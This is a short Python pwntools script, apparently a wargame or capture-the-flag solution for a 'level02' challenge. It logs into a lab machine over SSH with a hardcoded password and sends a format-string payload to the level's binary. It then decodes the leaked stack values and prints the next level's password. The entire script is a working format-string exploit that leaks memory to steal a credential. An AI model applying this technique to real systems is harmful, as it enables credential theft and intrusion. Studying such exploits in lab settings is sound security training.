from pwn import *


# Change host according to your configuration
s = ssh(
    user="level02",
    host="192.168.56.105",
    password="PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv",
    port=4242
)

payload1 = ""

for i in range(22, 27):
    payload1 += f"%{i}$p"

payload2 = ""

p = s.process("/home/users/level02/level02")
p.sendline(payload1)
p.sendline(payload2)

#p.interactive()
#p.stream()
output = p.recvall().decode('utf-8')

res = ""

for i in output.split('\n')[-2].split(' ')[0].split('0x')[1:]:
    res += unhex(i)[::-1].decode('utf-8')
print("The level03 user password is : " + res)


p.close()
s.close()
